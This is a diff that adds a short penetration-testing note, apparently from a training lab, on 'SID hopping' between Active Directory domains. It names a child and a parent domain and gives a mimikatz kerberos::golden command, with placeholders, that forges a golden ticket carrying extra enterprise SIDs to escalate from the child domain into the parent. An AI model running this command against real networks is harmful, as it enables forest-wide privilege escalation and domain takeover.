@@ -1,0 +1,14 @@
+SID HOPPING
+Sid Hopping Template
+
+
+target domain: admin.offshore.com
+
+current (child) domain: dev.admin.offshore.com
+
+child domain sid:
+
+Command for SID Hopping Golden Ticket:
+
+mimikatz kerberos::golden /user:<any user> /domain:<child domain> /sid:<child domain sid> /sids:<sids of enterprise domains in parent> /krbtgt:<krbtgt hash of child> /ptt
+
